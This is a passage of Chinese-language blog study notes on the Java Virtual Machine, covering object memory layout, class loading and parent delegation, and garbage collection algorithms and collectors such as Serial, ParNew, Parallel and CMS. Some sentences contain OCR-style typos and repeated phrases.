<h1>4 对象的内存布局</h1>
<p>在 Hotspot 虚拟机中，对象在内存中的布局可以分为 3 块区域：<strong>对象头（Header）、实例数据（Instance Data）和对齐填充（Padding）</strong>。</p>
<p>对象头包括两部分信息：</p>
<ol>
<li class="lvl-3">
<p><code>标记字段（Mark Word）</code>：用于存储对象自身的运行时数据， 如哈希码（HashCode）、<code>GC 分代年龄</code>、<code>锁状态标志</code>、线程持有的锁、偏向线程 ID、偏向时间戳等等。</p>
</li>
<li class="lvl-3">
<p>类型指针（Klass Word）：对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。</p>
</li>
</ol>
<blockquote>
<p>[!note] 对象头</p>
</blockquote>
<p>Hotspot 虚拟机的对象头( Object Header ) 分为两部分信息，第一部分用于存储对象自身的运行时数据，如哈希码GC( HashCode ) 、GC 分代年龄( Generational Age ) 等，这部分数据的长度在32 位和64 位的虚拟机中分别为32 个和64 个Bits,官方称它为“<mark>Mark Word</mark>&quot;,它是实现轻量级锁和偏向锁的关键另外一部分用千存储指向方法区对象类型数据的指针，如果是数组对象的话，还会有一个额外的部分用千存储数组长度。</p>
<p>如在32 位的HotSpot 虚拟机中对象未被锁定的状态下， Mark Word 的32 个Bits 空间中的25Bits 用千存储对象哈希码(HashCode ) , 4B心用千存储对象分代年龄， 2Bits 用千存储锁标志位，lBit 固定为0.</p>
<p><strong>实例数据部分是对象真正存储的有效信息</strong>，也是在程序中所定义的各种类型的字段内容。</p>
<p><strong>对齐填充部分不是必然存在的，也没有什么特别的含义，仅仅起占位作用。</strong> 因为 Hotspot 虚拟机的自动内存管理系统要求对象起始地址必须是 8 字节的整数倍，换句话说就是对象的大小必须是 8 字节的整数倍。而对象头部分正好是 8 字节的倍数（1 倍或 2 倍），因此，当对象实例数据部分没有对齐时，就需要通过对齐填充来补全。</p>
<h1>5 类加载过程</h1>
<p><a href="https://mp.weixin.qq.com/s/v-CnKRO0ezSxdocS0Ff2vQ">类加载机制与类加载器 (qq.com)</a></p>
<blockquote>
<p>[!note]</p>
<ul class="lvl-1">
<li class="lvl-2">通过类加载器执行类加载（双亲委派模型）</li>
<li class="lvl-2">验证类的字节流信息</li>
<li class="lvl-2">为类变量分配内存</li>
<li class="lvl-2">执行初始化</li>
</ul>
</blockquote>
<h2 id="5-1-类的生命周期">5.1 类的生命周期</h2>
<p>类从被加载到虚拟机内存中开始到卸载出内存为止，它的整个生命周期可以简单概括为 7 个阶段：：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化（Initialization）、使用（Using）和卸载（Unloading）。其中，验证、准备和解析这三个阶段可以统称为连接（Linking）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092255659.png" alt="image.png|450"></p>
<h2 id="5-2-类加载过程">5.2 类加载过程</h2>
<ol>
<li class="lvl-3">
<p><code>加载</code>：加载通过 <strong>类加载器</strong> 完成（加载一个类的时候，具体是哪个类加载器加载由 <strong>双亲委派模型</strong> 决定），通过类的全限定名（包名 + 类名），获取到该类的.class文件的二进制字节流，将二进制字节流所代表的静态存储结构，转化为方法区运行时的数据结构，在内存中生成一个代表该类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口</p>
</li>
<li class="lvl-3">
<p><code>连接</code>：</p>
<ol>
<li class="lvl-7"><code>验证</code>：确保class文件中的字节流包含的信息，符合当前虚拟机的要求，保证这个被加载的class类的正确性，不会危害到虚拟机的安全。验证阶段大致会完成以下四个阶段的检验动作：文件格式校验、元数据验证、字节码验证、符号引用验证</li>
<li class="lvl-7"><code>准备</code>: 为类中的静态字段分配内存，并<code>设置默认的初始值</code>，比如int类型初始值是0。被final修饰的static字段不会设置，因为final在编译的时候就分配了</li>
<li class="lvl-7"><code>解析</code>：<strong>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。</strong></li>
</ol>
</li>
<li class="lvl-3">
<p><code>初始化</code>：执行类的构造器方法，包括<code>静态字段赋值</code>的动作，以及执行类定义中的静态初始化块内的逻辑（初始化阶段是执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。）</p>
</li>
<li class="lvl-3">
<p><code>使用</code>：使用类或者创建对象</p>
</li>
<li class="lvl-3">
<p><code>卸载</code>：如果有下面的情况，类就会被卸载：1. <em>该类所有的实例都已经被回收</em>，也就是java堆中不存在该类的任何实例。2. 加载该类的ClassLoader已经被回收（<em>该类的类加载器的实例已被 GC</em>）。 3. 类对应的java.lang.Class对象没有任何地方被引用，无法在任何地方通过反射访问该类的方法。（ <em>该类没有在其他任何地方被引用</em>）</p>
</li>
</ol>
<blockquote>
<p>[!note] 准备</p>
</blockquote>
<p><strong>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>这时候进行内存分配的仅包括类变量（ Class Variables ，即静态变量，被 <code>static</code> 关键字修饰的变量，只与类相关，因此被称为类变量），而不包括实例变量。实例变量会在对象实例化时随着对象一块分配在 Java 堆中。</p>
</li>
<li class="lvl-2">
<p>从概念上讲，类变量所使用的内存都应当在 <strong>方法区</strong> 中进行分配。不过有一点需要注意的是：JDK 7 之前，HotSpot 使用永久代来实现方法区的时候，实现是完全符合这种逻辑概念的。 而在 JDK 7 及之后，HotSpot 已经把原本放在永久代的字符串常量池、静态变量等移动到堆中，这个时候类变量则会随着 Class 对象一起存放在 Java 堆中。</p>
</li>
</ul>
<h1>6 类加载器</h1>
<p>类加载器是一个负责加载类的对象。<code>ClassLoader</code> 是一个抽象类。给定类的二进制名称，类加载器应尝试定位或生成构成类定义的数据。每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。</p>
<p><strong>类加载器的主要作用就是加载 Java 类的字节码（ <code>.class</code> 文件）到 JVM 中（在内存中生成一个代表该类的 <code>Class</code> 对象）。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="comment">// 由这个类加载器加载的类。</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Vector&lt;Class&lt;?&gt;&gt; classes = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// 由VM调用，用此类加载器记录每个已加载类。</span></span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">addClass</span><span class="params">(Class&lt;?&gt; c)</span> &#123;</span><br><span class="line">        classes.addElement(c);</span><br><span class="line">   &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>BootstrapClassLoader</code>(启动类加载器)：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK 内部的核心类库（ <code>%JAVA_HOME%/lib</code>目录下的 <code>rt.jar</code>、<code>resources.jar</code>、<code>charsets.jar</code>等 jar 包和类）以及被 <code>-Xbootclasspath</code>参数指定的路径下的所有类。</p>
</li>
<li class="lvl-2">
<p><strong><code>ExtensionClassLoader</code>(扩展类加载器)</strong>：主要负责加载 <code>%JRE_HOME%/lib/ext</code> 目录下的 jar 包和类以及被 <code>java.ext.dirs</code> 系统变量所指定的路径下的所有类。</p>
</li>
<li class="lvl-2">
<p><strong><code>AppClassLoader</code>(应用程序类加载器)</strong>：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。</p>
</li>
</ul>
<h2 id="6-1-双亲委派模型">6.1 双亲委派模型</h2>
<p>双亲委派机制（Parent Delegation Mechanism）是 Java 中的一种类加载机制。在 Java 中，类加载器负责加载类的字节码并创建对应的 Class 对象。双亲委派机制的核心思想是：<code>当一个类加载器收到类加载请求时，它会先将该请求委派给它的父类加载器去尝试加载。只有当父级加载器无法加载该类时，才会尝试自行加载。</code></p>
<p>这个机制的作用在于<strong>保证类的加载是从上到下的</strong>，即从启动类加载器开始，逐级向下传递，直到找到所需的类或者无法加载。这样可以<strong>避免类的重复加载</strong>，提高了类加载的效率和安全性。例如，如果一个类已经被父类加载器加载过，那么子类加载器就不会再次加载它，从而避免了类的冲突和不一致性。</p>
<p>类加载器虽然只用于实现类的加载动作，但是对于任意一个类，都需要由加载它的<mark>类加载器和这个类本身</mark>共同确立其在Java虚拟机中的<strong>唯一性</strong>。</p>
<p>总之，双亲委派机制是 Java 类加载器中的一项重要特性，它<strong>确保了类的加载顺序和一致性</strong>，使得 Java 程序能够正常运行并保持良好的安全性。</p>
<h3 id="6-1-1-加载过程">6.1.1 加载过程</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载（每个父类加载器都会走一遍这个流程）。</p>
</li>
<li class="lvl-2">
<p>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。这样的话，所有的请求最终都会传送到顶层的启动类加载器 <code>BootstrapClassLoader</code> 中。</p>
</li>
<li class="lvl-2">
<p>只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去加载（调用自己的 <code>findClass()</code> 方法来加载类）。</p>
</li>
<li class="lvl-2">
<p>如果子类加载器也无法加载这个类，那么它会抛出一个 <code>ClassNotFoundException</code> 异常。</p>
</li>
</ul>
<h3 id="6-1-2-双亲委派模型好处">6.1.2 双亲委派模型好处</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>避免类的重复加载</p>
</li>
<li class="lvl-2">
<p>保护程序安全，防止核心API被随意篡改</p>
<ul class="lvl-2">
<li class="lvl-6">自定义类：java.lang.String (没用)</li>
<li class="lvl-6">自定义类：java.lang.ShkStart（报错：阻止创建 java.lang开头的类）</li>
</ul>
</li>
<li class="lvl-2">
<p>保证安全性：由于Java核心库被启动类加载器加载，而启动类加载器只加载信任的类路径中的类，这样可以防止不可信的类假冒核心类，增强了系统的安全性。例如，恶意代码无法自定义一个java.lang.System类并加载到JVM中，因为这个请求会被委托给启动类加载器，而启动类加载器只会加载标准的Java库中的类。</p>
</li>
<li class="lvl-2">
<p>保证类的唯一性：通过委托机制，确保了所有加载请求都会传递到启动类加载器，避免了不同类加载器重复加载相同类的情况，保证了Java核心类库的统一性，也防止了用户自定义类覆盖核心类库的可能。</p>
</li>
<li class="lvl-2">
<p>支持隔离和层次划分：双亲委派模型支持不同层次的类加载器服务于不同的类加载需求，如应用程序类加载器加载用户代码，扩展类加载器加载扩展框架，启动类加载器加载核心库。这种层次化的划分有助于实现沙箱安全机制，保证了各个层级类加载器的职责清晰，也便于维护和扩展。</p>
</li>
</ul>
<h3 id="6-1-3-打破双亲委派模型">6.1.3 打破双亲委派模型</h3>
<p>自定义加载器的话，需要继承 <code>ClassLoader</code> 。如果我们不想打破双亲委派模型，就重写 <code>ClassLoader</code> 类中的 <code>findClass()</code> 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 <code>loadClass()</code> 方法。</p>
<p>为什么是重写 <code>loadClass()</code> 方法打破双亲委派模型呢？双亲委派模型的执行流程已经解释了：</p>
<blockquote>
<p>类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。</p>
</blockquote>
<p>重写 <code>loadClass()</code>方法之后，我们就可以改变传统双亲委派模型的执行流程。例如，子类加载器可以在委派给父类加载器之前，先自己尝试加载这个类，或者在父类加载器返回之后，再尝试从其他地方加载这个类。具体的规则由我们自己实现，根据项目需求定制化。</p>
<p>Tomcat 服务器为了能够优先加载 Web 应用目录下的类，然后再加载其他目录下的类，就自定义了类加载器 <code>WebAppClassLoader</code> 来打破双亲委托机制。这也是 Tomcat 下 Web 应用之间的类实现隔离的具体原理。</p>
<h3 id="6-1-4-需要打破双亲委派模型场景">6.1.4 需要打破双亲委派模型场景</h3>
<p>同一个类：类的路径名、类加载器</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>重写String类</p>
</li>
<li class="lvl-2">
<p>自定义类加载器：容器Tomcat</p>
</li>
<li class="lvl-2">
<p>一个web容器部署两个或者多个应用程序，不同的应用程序，可能会依赖同一个第三方类库的不同版本，还要能保证每一个应用程序的类库都是独立、相互隔离的效果。</p>
</li>
<li class="lvl-2">
<p>Tomcat中可以部署多个web项目，为了保证每个web项目互相独立，所以不能都由AppClassLoader加载，所以自定义了类加载器WebappClassLoader，WebappClassLoader继承自URLClassLoader，重写了findClass和loadClass，并且WebappClassLoader的父类加载器设置为AppClassLoader。  WebappClassLoader.loadClass中会先在缓存中查看类是否加载过，没有加载，就交给ExtClassLoader，ExtClassLoader再交给BootstrapClassLoader加载；都加载不了，才自己加载；自己也加载不了，就遵循原始的双亲委派，交由AppClassLoader递归加载。</p>
</li>
</ul>
<p>单纯依靠自定义类加载器没办法满足某些场景的要求，例如，有些情况下，高层的类加载器需要加载低层的加载器才能加载的类。</p>
<p><a href="https://cloud.tencent.com/developer/article/2055271">详谈双亲委派机制（面试常问）[通俗易懂]-腾讯云开发者社区-腾讯云 (tencent.com)</a><br>
<a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">java中双亲委派机制(+总结） - luwanglin - 博客园 (cnblogs.com)</a></p>
<h1>7 参考</h1>
<p><a href="https://blog.csdn.net/o9109003234/article/details/121917786">某团面试：如果线上遇到了OOM，你该如何排查？如何解决？哪些方案？-CSDN博客</a><br>
<a href="https://javaguide.cn/java/jvm/memory-area.html#%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E5%AE%9A%E4%BD%8D">Java内存区域详解（重点） | JavaGuide</a><br>
<a href="https://javaguide.cn/java/jvm/class-loading-process.html">类加载过程详解 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM (2)：垃圾回收</title>
    <url>/2024/04/08/%E6%A1%86%E6%9E%B6/JVM/JVM%20(2)%EF%BC%9A%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</url>
    <content><![CDATA[<h1>1 什么时候会触发GC</h1>
<p>在Java虚拟机中，垃圾回收（GC）会在以下几种情况下触发：</p>
<ol>
<li class="lvl-3"><strong>系统内存不足</strong>：当Java虚拟机检测到系统内存不足时，会触发垃圾回收来释放内存空间，以确保应用程序的正常运行。这通常是通过监视堆内存的使用情况来检测的。</li>
<li class="lvl-3"><strong>调用System.gc()方法</strong>：虽然调用System.gc()方法并不会立即触发垃圾回收，但它会向Java虚拟机发出建议性的垃圾回收请求。Java虚拟机可以选择是否立即响应这个请求。</li>
<li class="lvl-3"><strong>长时间停顿</strong>：当应用程序执行时间较长，而且没有进行垃圾回收时，Java虚拟机可能会为了避免堆内存耗尽而触发垃圾回收。这种情况下，垃圾回收通常会引起一段较长的停顿时间，称为Full GC。</li>
<li class="lvl-3"><strong>Young Generation满</strong>：在分代垃圾回收器中，当Young Generation区域满时，会触发一次Minor GC。这会导致Eden区和Survivor区的垃圾回收。</li>
<li class="lvl-3"><strong>Old Generation满</strong>：如果Old Generation区域满了，会触发一次Major GC（也称为Full GC）。这种情况下，整个堆内存都会进行垃圾回收。</li>
<li class="lvl-3"><strong>永久代/元空间满</strong>：对于HotSpot虚拟机，如果永久代（Java 7之前）或者元空间（Java 8及之后）满了，会触发一次垃圾回收。这种情况下，垃圾回收主要针对类的元数据和常量池。</li>
</ol>
<h1>2 Full GC、Minor GC</h1>
<h2 id="2-1-Full-GC">2.1 Full GC</h2>
<p><strong>调用System.gc()方法</strong><br>
<strong>Old Generation满</strong><br>
<mark>空间分配担保</mark>：在发生Minor GC 时，虚拟机会检测之前每次晋升到老年代的平均大小是否大于老年代的剩余空间大小，如果大于，则改为直接进行一次Full GC 。如果小于，则查看HandlePromotionFailure 设置是否允许担保失败；如果允许，那只会进行Minor GC; 如果不允许，则也要改为进行一次Full GC 。</p>
<h1>3 内存分配与回收</h1>
<ol>
<li class="lvl-3">
<p>对象优先在 Eden 区分配：大多数情况下，对象在新生代中 Eden 区分配。当 Eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC。</p>
</li>
<li class="lvl-3">
<p>大对象直接进入老年代：大对象就是需要大量连续内存空间的对象（比如：字符串、数组）。</p>
</li>
<li class="lvl-3">
<p>长期存活的对象将进入老年代：对象在 Survivor 中每熬过一次 MinorGC,年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。</p>
</li>
<li class="lvl-3">
<p>动态对象年龄判定</p>
</li>
<li class="lvl-3">
<p>空间分配担保：空间分配担保是为了确保在 Minor GC 之前老年代本身还有容纳新生代所有对象的剩余空间。</p>
</li>
<li class="lvl-3">
<p>只要老年代的连续空间大于（新生代所有对象的总大小或者历次晋升的平均大小）就会进行minor GC，否则会进行full GC</p>
</li>
</ol>
<h1>4 死亡对象判断方法</h1>
<h2 id="4-1-引用计数法">4.1 引用计数法</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>引用为0的对象不再被使用</p>
</li>
<li class="lvl-2">
<p>实现简单、效率高</p>
</li>
<li class="lvl-2">
<p>无法解决对象之间的<mark>循环引用</mark>问题</p>
</li>
</ul>
<h2 id="4-2-可达性分析算法">4.2 可达性分析算法</h2>
<blockquote>
<p>根搜索算法(GC Roots Tracing)：通过一系列的称为 <strong>“GC Roots”</strong> 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的，需要被回收。</p>
</blockquote>
<blockquote>
<p>[!note] 基本思路</p>
</blockquote>
<ol>
<li class="lvl-3">
<p>可达性分析算法是以根对象集合（GCRoots——就是一组必须活跃的引用）为起始点，按照从上至下的方式搜索被根对象集合所连接的目标对象是否可达</p>
</li>
<li class="lvl-3">
<p>使用可达性分析算法后，内存中的存活对象都会被根对象集合直接或间接连接着，搜索所走过的路径称为引用链</p>
</li>
<li class="lvl-3">
<p>如果目标对象没有任何引用链相连，则是不可达的，就意味着该对象己经死亡，可以标记为垃圾对象</p>
</li>
<li class="lvl-3">
<p>在可达性分析算法中，只有能够被根对象集合直接或者问接连接的对象才是存活对象</p>
</li>
</ol>
<p><strong>Root对象</strong>主要包括：<br>
①系统类加载器（bootstrap）加载的类。<br>
②JVM方法区中静态属性引用的对象。<br>
③JVM常量池中引用的对象。<br>
④JVM<mark>虚拟机栈</mark>中引用的对象。<br>
⑤JVM<mark>本地方法栈</mark>中引用的对象。<br>
⑥活动着的线程。</p>
<p>可作为GC Roots的对象：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>虚拟机栈(栈帧中的本地变量表)中引用的对象</p>
</li>
<li class="lvl-2">
<p>本地方法栈(Native 方法)中引用的对象</p>
</li>
<li class="lvl-2">
<p>方法区中<mark>类静态属性</mark>引用的对象</p>
</li>
<li class="lvl-2">
<p>方法区中<mark>常量引用</mark>的对象</p>
</li>
</ul>
<blockquote>
<p>快速找到GC Roots：<br>
**OopMap存储两种对象引用：对象内的引用   栈、寄存器中的引用</p>
</blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/125765937">Java虚拟机如何快速找到GC Roots？又是如何中断线程？ - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/a289246/article/details/140649273">JVM之垃圾回收（一）：引用计数法+可达性分析算法_垃圾回收 可达性分析和引用计数器哪个好-CSDN博客</a></p>
<h2 id="4-3-引用类型">4.3 引用类型</h2>
<p><strong>1．强引用（StrongReference）</strong><br>
当内存空间不足，Java 虚拟机抛出 OutOfMemoryError 错误，使程序异常终止</p>
<p><strong>2．软引用（SoftReference）</strong><br>
可有可无，如果内存空间足够，垃圾回收器就不会回收它，如果<mark>内存空间不足，就会回收这些对象的内存</mark>。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p>
<p><strong>3．弱引用（WeakReference）</strong><br>
可有可无，弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。</p>
<p><strong>4．虚引用（PhantomReference）</strong><br>
虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。<strong>虚引用主要用来跟踪对象被垃圾回收的活动</strong>。</p>
<p>虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。</p>
<h2 id="4-4-回收方法区">4.4 回收方法区</h2>
<p>永久代的垃圾收集主要回收两部分内容：废弃常量和无用的类</p>
<p>废弃常量：假如在字符串常量池中存在字符串 “abc”，如果当前没有任何 String 对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，“abc” 就会被系统清理出常量池了。</p>
<p>无用的类：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。</p>
</li>
<li class="lvl-2">
<p>加载该类的 <code>ClassLoader</code> 已经被回收。</p>
</li>
<li class="lvl-2">
<p>该类对应的 <code>java.lang.Class</code> 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。</p>
</li>
</ul>
<h1>5 垃圾收集算法</h1>
<p>部分收集（ Partial GC）：指目标不是完整收集整个 Java堆的垃圾收集，其中又分为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>新生代收集（ Minor GC/Young GC）：指目标只是新生代的垃圾收集。通常采用复制算法，速度较快且频繁。</p>
</li>
<li class="lvl-2">
<p>老年代收集（ Major GC/Old GC）：指目标只是老年代的垃圾收集。目前只有 CMS收集器会有单独收集老年代的行为。混合收集（Mixed GC）：指目标是收集整个新生代以及部分老年代的垃圾收集。目前只有G1收集器会有这种行收集器会有这种行为。</p>
</li>
</ul>
<p>整堆收集（ Full GC）：收集整个 Java堆和方法区的垃圾收集。而Full GC则发生在整个堆空间中，包括新生代和老年代（Old Generation），用于清理整个堆中的垃圾对象，速度较慢且可能导致较大的应用停顿。</p>
<p>因此，Minor GC和Full GC的主要区别在于它们发生的区域和影响范围。</p>
<h2 id="5-1-标记-清除算法">5.1 标记-清除算法</h2>
<p>标记-清除（Mark-and-Sweep）算法分为“标记（Mark）”和“清除（Sweep）”阶段：首先标记出所有不需要回收的对象，在标记完成后统一回收掉所有没有被标记的对象。</p>
<p>存在问题：</p>
<ol>
<li class="lvl-3">
<p><strong>效率问题</strong>：标记和清除两个过程效率都不高。</p>
</li>
<li class="lvl-3">
<p><strong>空间问题</strong>：标记清除后会产生大量不连续的内存碎片。</p>
</li>
</ol>
<h2 id="5-2-标记-复制算法">5.2 标记-复制算法</h2>
<p>将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。</p>
<p>存在问题：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>可用内存变小</strong>：可用内存缩小为原来的一半。</p>
</li>
<li class="lvl-2">
<p><strong>不适合老年代</strong>：如果存活对象数量比较大，复制性能会变得很差。</p>
</li>
</ul>
<p>这种收集算法主要用于<code>回收新生代</code>，将内存划分为1：1的比例会浪费大量内存。</p>
<p>Appel式回收的具体做法是把新生代分为一块较大的 Eden空间和两块较小的 Survivor空间，每次分配内存只使用Eden和其中一块 Survivor。发生垃圾搜集时，将 Eden和 Survivor中仍然存活的对象一次性复制到另外一块 Survivor空间上，然后直接清理掉 Eden和已用过的那块 Survivor空间。</p>
<p>回收后存活的对象可能大于Survivor空间的大小，当Survivor空间不足以容纳一次空间不足以容纳一次Minor GC之后存活的对象时，就需要依赖其他内存区域（实际上大多就是老年代）进行<mark>分配担保（Handle Promotion）</mark>。</p>
<p>如果另外一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象，这些对象便将通过分配担保机制直接进入老年代。</p>
<h2 id="5-3-标记-整理算法">5.3 标记-整理算法</h2>
<p>标记-整理（Mark-and-Compact）算法是根据<mark>老年代</mark>的特点提出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是<code>让所有存活的对象向一端移动</code>，然后直接清理掉端边界以外的内存。</p>
<p>存在问题：如果移动存活对象，尤其是在老年代这种每次回收都有大量对象存活区域，移动存活对活对象并更新所有引用这些对象的地方将会是一种极为负重的操作，而且这种对象移动象操作操作必须全程暂停用户应用程序才能进行必须全程暂停用户应用程序才能进行（<strong>Stop The World</strong>）</p>
<h2 id="5-4-分代收集算法">5.4 分代收集算法</h2>
<p>根据对象存活周期的不同将内存分为几块。一般将 Java 堆分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。</p>
<p>比如在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。</p>
<h1>6 垃圾收集器</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404091510064.png" alt="image.png|500"></p>
<table>
<thead>
<tr>
<th>垃圾收集器</th>
<th>关注</th>
<th>垃圾收集算法</th>
</tr>
</thead>
<tbody>
<tr>
<td>Parallel Scavenge</td>
<td>吞吐量</td>
<td>标记-整理</td>
</tr>
<tr>
<td>CMS</td>
<td>延迟</td>
<td>标记-清除</td>
</tr>
</tbody>
</table>
<h2 id="6-1-Serial-串行-收集器">6.1 Serial(串行)收集器</h2>
<p>单线程收集器，使用一条垃圾收集线程去完成垃圾收集工作，在进行垃圾收集工作的时候必须暂停其他所有的工作线程（ <strong>“Stop The World”</strong> ），直到它收集结束。用户线程因垃圾收集而导致停顿。<br>
<strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>简单高效</p>
</li>
<li class="lvl-2">
<p>运行在客户端模式下的默认新生代收集器</p>
</li>
</ul>
<h2 id="6-2-Serial-Old收集器">6.2 Serial Old收集器</h2>
<p><strong>Serial 收集器的老年代版本</strong>，它同样是一个单线程收集器。它主要有两大用途：一种用途是在 JDK1.5 以及以前的版本中与 Parallel Scavenge 收集器搭配使用，另一种用途是作为 CMS 收集器的后备方案。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092110885.png" alt="image.png"></p>
<h2 id="6-3-ParNew收集器">6.3 ParNew收集器</h2>
<p>ParNew 收集器其实就是 Serial 收集器的多线程<mark>并行</mark>版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和 Serial 收集器完全一样。</p>
<p><strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p>
<p>它是许多运行在 Server 模式下的虚拟机的首要选择，除了 Serial 收集器外，只有它能与 CMS 收集器（真正意义上的并发收集器，后面会介绍到）配合工作。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092128082.png" alt="image.png"></p>
<p>并行（并行（Parallel）：并行描述的是多条垃圾收集器线程之间的关系，说明同一时间有多条这样的线程在协同工作，通常默认此时用户线程是处于等待状态。</p>
<p>并发（ Concurrent）：并发描述的是垃圾收集器线程与用户线程之间的关系，说明同一时间垃圾收集器线程与用户线程都在运行。由于用户线程并未被冻结，所以程序仍然能响应服务请户线程都在运行。但由于垃圾收集器线程占用了一部分系统资源，此时应用程序的处理的吞吐量将受到一定影响。</p>
<h2 id="6-4-Parallel-Scavenge-收集器（吞吐量）">6.4 Parallel Scavenge 收集器（吞吐量）</h2>
<p>Parallel Scavenge 收集器也是使用标记-复制算法的多线程收集器，Parallel Scavenge 收集器关注点是吞吐量（高效率的利用 CPU）。CMS 等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。<br>
$$<br>
吞吐量=\frac{运行用户代码时间}{运行用户代码时间+运行垃圾收集时间}<br>
$$<br>
停顿时间越短就越适合需要与用户交互或需要保证服务响应质量的程序，良好的响应速度能提升用户体验；而高吞吐量则可以最高效率地利用处理器资源，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交的分析任务。</p>
<p><strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p>
<h2 id="6-5-Parallel-Old-收集器（吞吐量）">6.5 Parallel Old 收集器（吞吐量）</h2>
<p><strong>Parallel Scavenge 收集器的老年代版本</strong>。使用多线程和“标记-整理”算法。在注重吞吐量以及 CPU 资源的场合，都可以优先考虑 Parallel Scavenge 收集器和 Parallel Old 收集器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404092138889.png" alt="image.png"></p>
<h2 id="6-6-CMS-Concurrent-Mark-Sweep-（停顿时间）">6.6 CMS(Concurrent Mark Sweep)（停顿时间）</h2>
<p>支持并发的垃圾收集器，它首次实现了让垃圾收集线程与用户线程（基本上）同时工作。并发的垃圾收集器，它首次实现了让垃圾收集线程与用户线程（基本上）同时工作。</p>
<p>CMS（Concurrent Mark Sweep）收集器是一种以获取<mark>最短回收停顿时间</mark>为目标的收集器。它非常符合在注重用户体验的应用上使用。<br>
